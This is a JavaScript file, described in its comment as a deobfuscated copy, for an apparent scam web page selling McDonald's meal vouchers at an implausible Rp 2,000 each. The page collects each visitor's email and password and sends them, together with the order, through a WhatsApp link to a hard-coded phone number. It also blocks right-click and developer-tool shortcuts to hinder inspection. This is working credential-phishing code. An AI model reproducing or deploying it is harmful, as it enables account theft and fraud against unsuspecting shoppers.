// Versi bersih dari skrip obfuscated
(function () {
  "use strict";

  // Tambahkan style Tailwind via JavaScript
  const style = document.createElement("style");
  style.innerHTML = `
    body { background-color: #0f172a; color: white; font-family: sans-serif; }
    .voucher-card { position: relative; transition: all 0.3s ease-in-out; }
    .voucher-card.selected { border: 2px solid #14b8a6; }
    .voucher-image { border-radius: 0.5rem; }
    .quantity-badge { position: absolute; top: 0.5rem; right: 0.5rem; }
  `;
  document.head.appendChild(style);

  const data = [
    {
      _id: "1",
      image:
        "https://cfg-cdn-west-europe-gma.vmobapps.com/xy/1200/1200?path=op230386_id_H4939ca393c-12.png&tId=LGM695&imageFormat=jpeg",
      title: "PaNas 1",
      description: "PaNas 1",
      price: 2000,
    },
    {
      _id: "2",
      image:
        "https://cfg-cdn-west-europe-gma.vmobapps.com/xy/1200/1200?path=op213311_id_H273099e33d-12.png&tId=LGM695&imageFormat=jpeg",
      title: "Paket 1",
      description:
        "Paket hemat McDonald's: 1 Medium Fries + 1 Spicy Chicken Bites + 1 Medium Fanta",
      price: 2000,
    },
    {
      _id: "3",
      image:
        "https://cfg-cdn-west-europe-gma.vmobapps.com/xy/1200/1200?path=op213310_id_H05ae31485a-15.png&tId=LGM695&imageFormat=jpeg",
      title: "Paket 2",
      description:
        "Paket hemat McDonald's: 1 Chicken Burger Deluxe + 1 Small Fries + 1 Medium Coca-Cola",
      price: 2000,
    },
    {
      _id: "4",
      image:
        "https://cfg-cdn-west-europe-gma.vmobapps.com/xy/1200/1200?path=op213448_id_H2e875a436e-13.png&tId=LGM695&imageFormat=jpeg",
      title: "Paket 3",
      description: "2 Ayam Spicy McD + 2 Sprite M",
      price: 2000,
    },
    {
      _id: "5",
      image:
        "https://cfg-cdn-west-europe-gma.vmobapps.com/xy/1200/1200?path=op213446_id_H588a3130f6-12.png&tId=LGM695&imageFormat=jpeg",
      title: "Paket 4",
      description: "1 Ayam Spicy McD + 1 Sprite S",
      price: 2000,
    },
    {
      _id: "6",
      image:
        "https://cfg-cdn-west-europe-gma.vmobapps.com/xy/1200/1200?path=op213445_id_H3b695c435a-10.png&tId=LGM695&imageFormat=jpeg",
      title: "Paket 5",
      description: "1 Ayam Krispy McD + 1 Coca-Cola (M)",
      price: 2000,
    },
    {
      _id: "7",
      image:
        "https://cfg-cdn-west-europe-gma.vmobapps.com/xy/1200/1200?path=op213312_id_H2e00ecab15-12.png&tId=LGM695&imageFormat=jpeg",
      title: "Paket 6",
      description: "1 Ayam Krispy McD + 1 Kentang Goreng (M) + 1 Coca-Cola (M)",
      price: 2000,
    },
    {
      _id: "8",
      image:
        "https://cfg-cdn-west-europe-gma.vmobapps.com/xy/1200/1200?path=op213309_id_H27bf333f31-15.png&tId=LGM695&imageFormat=jpeg",
      title: "Paket 7",
      description: "1 McSpaghetti + 1 Coca-Cola McFloat",
      price: 2000,
    },
    {
      _id: "9",
      image:
        "https://cfg-cdn-west-europe-gma.vmobapps.com/xy/1200/1200?path=op213308_id_H22f7b6e782-12.png&tId=LGM695&imageFormat=jpeg",
      title: "Paket 8",
      description: "1 Ayam Krispy McD + 1 Kentang Goreng (S) + 1 Coca-Cola (M)",
      price: 2000,
    },
    {
      _id: "10",
      image:
        "https://cfg-cdn-west-europe-gma.vmobapps.com/xy/1200/1200?path=op213303_id_Hd44fe764da-11.png&tId=LGM695&imageFormat=jpeg",
      title: "Paket 9",
      description: "1 Ayam Spicy McD + 1 Spicy Chicken Bites + 1 Sprite (S)",
      price: 2000,
    },
    {
      _id: "11",
      title: "Paket 10",
      description: "Tiktok Live 96.4",
      image:
        "https://d2vuyvo9qdtgo9.cloudfront.net/new_image/mass/20250620114833.jpg",
      price: 2000,
    },
    {
      _id: "12",
      image:
        "https://cfg-cdn-west-europe-gma.vmobapps.com/xy/1200/1200?path=op213302_id_H4218c1844c-12.png&tId=LGM695&imageFormat=jpeg",
      title: "Paket 11",
      description:
        "1 Beef Burger Deluxe + 1 Kentang Goreng (S) + 1 Coca-Cola (M)",
      price: 2000,
    },

    // ... sisanya sama seperti array sebelumnya
  ];

  let cart = {};
  let totalCount = 0;
  const minOrder = 5;
  const itemPrice = 2000;
  const whatsappNumber = "62895381587961";

  const dom = {
    grid: null,
    cartCount: null,
    cartTotal: null,
    summary: null,
    totalAmount: null,
    whatsappBtn: null,
    form: null,
    toggleBtn: null,
    password: null,
  };

  const fallbackImg =
    "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzAwIiBoZWlnaHQ9IjIwMCIgdmlld0JveD0iMCAwIDMwMCAyMDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIzMDAiIGhlaWdodD0iMjAwIiBmaWxsPSJsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCAjRkZENzAwLCAjRkZBNTAwKSIvPgo8ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxMjUgNzUpIj4KPGNpcmNsZSBjeD0iMjUiIGN5PSIyNSIgcj0iMjQiIGZpbGw9IiNGRkYiIGZpbGwtb3BhY2l0eT0iMC4yIi8+CjxwYXRoIGQ9Ik0zNSAyNUgyNVYzNUgyMFYyNUgxNVYyMEgyNVYxNUgzNVYyMFoiIGZpbGw9IiNGRkYiLz4KPC9nPgo8dGV4dCB4PSIxNTAiIHk9IjEzMCIgZm9udC1mYW1pbHk9IkFyaWFsLCBzYW5zLXNlcmlmIiBmb250LXNpemU9IjE0IiBmaWxsPSIjRkZGIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5Nb0RvbmFsZCdzIFZvdWNoZXI8L3RleHQ+Cjwvc3ZnPg==";

  function init() {
    dom.grid = document.getElementById("vouchersGrid");
    dom.cartCount = document.getElementById("cartCount");
    dom.cartTotal = document.getElementById("cartTotal");
    dom.summary = document.getElementById("summaryContent");
    dom.totalAmount = document.getElementById("totalAmount");
    dom.whatsappBtn = document.getElementById("whatsappBtn");
    dom.form = document.getElementById("orderForm");
    dom.toggleBtn = document.getElementById("passwordToggle");
    dom.password = document.getElementById("password");

    render();
    setupEvents();
  }

  function render() {
    let html = "";
    data.forEach((item) => {
      console.log(item);
      const qty = cart[item._id] || 0;
      const selectedClass = qty > 0 ? "selected" : "";
      html += `
        <div class="voucher-card ${selectedClass} bg-gray-50 text-white p-4 rounded-lg shadow-md mb-4" data-id="${
        item._id
      }">
          <img src="${item.image}" alt="${
        item.title
      }" class="voucher-image w-full h-auto mb-3 rounded" onerror="this.src='${fallbackImg}';">
          <div class="voucher-content">
            <h4 class="voucher-title text-lg font-semibold text-gray-900 mb-1">${
              item.title
            }</h4>
            <p class="voucher-description text-sm text-gray-900 mb-3">${
              item.description
            }</p>
            <div class="voucher-footer flex justify-between items-center">
              <div class="voucher-price text-sm text-red-500 font-bold">Rp ${
                item.price
              }</div>
              <div class="quantity-controls flex items-center gap-2">
                <button class="bg-red-500 px-2 py-1 rounded text-white" onclick="minus('${
                  item._id
                }')" ${qty <= 0 ? "disabled" : ""}>-</button>
                <span class="text-black font-medium">${qty}</span>
                <button class="bg-green-500 px-2 py-1 rounded text-white" onclick="plus('${
                  item._id
                }')">+</button>
              </div>
            </div>
          </div>
          <div class="quantity-badge absolute top-2 right-2 bg-teal-500 text-xs px-2 py-1 rounded-full">${qty}</div>
        </div>`;
    });
    dom.grid.innerHTML = html;
    updateSummary();
  }

  window.plus = function (id) {
    cart[id] = (cart[id] || 0) + 1;
    render();
  };

  window.minus = function (id) {
    if (cart[id] > 0) {
      cart[id]--;
      if (cart[id] === 0) delete cart[id];
    }
    render();
  };

  function updateSummary() {
    totalCount = 0;
    let total = 0;
    for (let id in cart) {
      totalCount += cart[id];
      total += cart[id] * itemPrice;
    }
    dom.cartCount.textContent = totalCount;
    dom.cartTotal.textContent = total.toLocaleString("id-ID");
    dom.totalAmount.textContent = total.toLocaleString("id-ID");

    if (totalCount === 0) {
      dom.summary.innerHTML = `<div class='empty-cart text-center text-gray-400'>Belum ada voucher dipilih</div>`;
      return;
    }
    let summaryHtml = "";
    for (let id in cart) {
      const item = data.find((d) => d._id === id);
      summaryHtml += `<div class='summary-item flex justify-between text-sm text-white border-b border-gray-700 py-1'><span>${
        item.title
      } x${cart[id]}</span><span>Rp ${(cart[id] * itemPrice).toLocaleString(
        "id-ID"
      )}</span></div>`;
    }
    dom.summary.innerHTML = summaryHtml;
    validateForm();
  }

  function validateForm() {
    const email = document.getElementById("email").value;
    const pass = document.getElementById("password").value;
    dom.whatsappBtn.disabled = !(totalCount >= minOrder && email && pass);
  }

  function setupEvents() {
    dom.form.addEventListener("submit", submitForm);
    dom.toggleBtn.addEventListener("click", togglePassword);
    ["email", "password"].forEach((id) => {
      document.getElementById(id).addEventListener("input", validateForm);
    });
  }

  function togglePassword() {
    const type = dom.password.type === "password" ? "text" : "password";
    dom.password.type = type;
  }

  function submitForm(e) {
    e.preventDefault();
    const email = document.getElementById("email").value;
    const pass = document.getElementById("password").value;

    if (totalCount < minOrder) return alert("Minimal pembelian 4 voucher!");
    if (!email || !pass) return alert("Harap lengkapi email dan password!");

    let message = `🎫 *PESANAN MYVOUCHER* 🎫\n\n👤 *DATA AKUN:*\n📧 Email: ${email}\n🔒 Password: ${pass}\n\n🛍️ *DETAIL PESANAN:*\n`;
    let total = 0;
    for (let id in cart) {
      const item = data.find((d) => d._id === id);
      const subtotal = cart[id] * itemPrice;
      message += `• ${item.title} x${cart[id]} = Rp ${subtotal.toLocaleString(
        "id-ID"
      )}\n`;
      total += subtotal;
    }
    message += `\n💰 *TOTAL: Rp ${total.toLocaleString(
      "id-ID"
    )}*\n📦 Total Voucher: ${totalCount} buah\n\n🏪 *MyVoucher - Premium McDonald's Deals*`;

    const encoded = encodeURIComponent(message);
    const url = `https://wa.me/${whatsappNumber}?text=${encoded}`;
    window.open(url, "_blank");
  }

  document.addEventListener("contextmenu", (e) => e.preventDefault());
  document.addEventListener("keydown", (e) => {
    if (
      (["F12", "u", "s"].includes(e.key) && e.ctrlKey) ||
      (e.ctrlKey && e.shiftKey && e.key === "I")
    ) {
      e.preventDefault();
    }
  });

  document.readyState === "loading"
    ? document.addEventListener("DOMContentLoaded", init)
    : init();
})();
